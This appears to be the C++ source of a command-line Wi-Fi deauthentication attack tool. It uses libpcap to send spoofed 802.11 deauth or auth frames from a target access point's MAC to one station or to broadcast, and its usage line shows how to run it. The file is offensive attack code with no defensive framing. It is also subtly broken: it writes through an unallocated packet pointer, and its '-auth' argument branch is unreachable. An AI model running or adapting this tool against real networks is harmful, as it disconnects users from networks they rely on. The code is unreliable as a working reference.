#include <iostream>
#include <bits/stdc++.h>
#include <pcap.h>
#include "mac.h"
#include "main.h"
using namespace std;

void usage()
{
    cout << "syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]]\n";
    cout << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB" << endl;
}

void set_packet(deauth_packet_t* packet, Mac ap_mac, Mac station_mac, bool auth){

    packet->radiotap.it_version = 0;
    packet->radiotap.it_pad = 0;
    packet->radiotap.it_len = sizeof(radiotap_header_t);
    packet->radiotap.it_present = 0x00028000;

    packet->dot11.frame_control[0] = 0xc0;
    packet->dot11.frame_control[1] = 0x00;
    packet->dot11.duration_id = 0x0000;
    packet->dot11.dst_mac = station_mac;
    packet->dot11.src_mac = ap_mac;
    packet->dot11.bssid = ap_mac;
    packet->dot11.seq_ctrl = 0x0000;
    packet->reason_code = 0x0007; // reason code 7: class 3 frame received from nonassociated station

    if (auth){
        packet->dot11.frame_control[0] = 0xb0;
        packet->dot11.frame_control[1] = 0x00;
        packet->dot11.duration_id = 0x013a;
        packet->dot11.dst_mac = station_mac;
        packet->dot11.src_mac = ap_mac;
        packet->dot11.bssid = ap_mac;
        packet->dot11.seq_ctrl = 0x0000;
        packet->reason_code = 0x0001; // reason code 1: unspecified reason
    }
}

void attack(pcap_t *handle, Mac ap_mac, Mac station_mac, bool auth){
    deauth_packet_t* packet;
    set_packet(packet, ap_mac, station_mac, auth);

    int time_out = 100;
    while(time_out--){
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(deauth_packet_t));
        if (res != 0){
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        else{
            printf("send deauth packet %d\n", time_out);
        }
        sleep(1);
    }
}

int main(int argc, char *argv[])
{

    if (argc < 3 || argc > 5)
    {
        usage();
        return -1;
    }

    char *dev = argv[1];
    Mac ap_mac = Mac(argv[2]);
    Mac station_mac;
    bool auth = false;

    if (argc == 3)
    {
        station_mac = Mac::broadcastMac();
    }
    else if (argc >= 4)
        station_mac = Mac(argv[3]);
    else if (argc == 5){
        if (string(argv[4]) == "-auth")
            auth = true;
        else
        {
            usage();
            return -1;
        }
    }
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 100, errbuf);
    if (handle == NULL)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    attack(handle, ap_mac, station_mac, auth);

    pcap_close(handle);
    return true;
}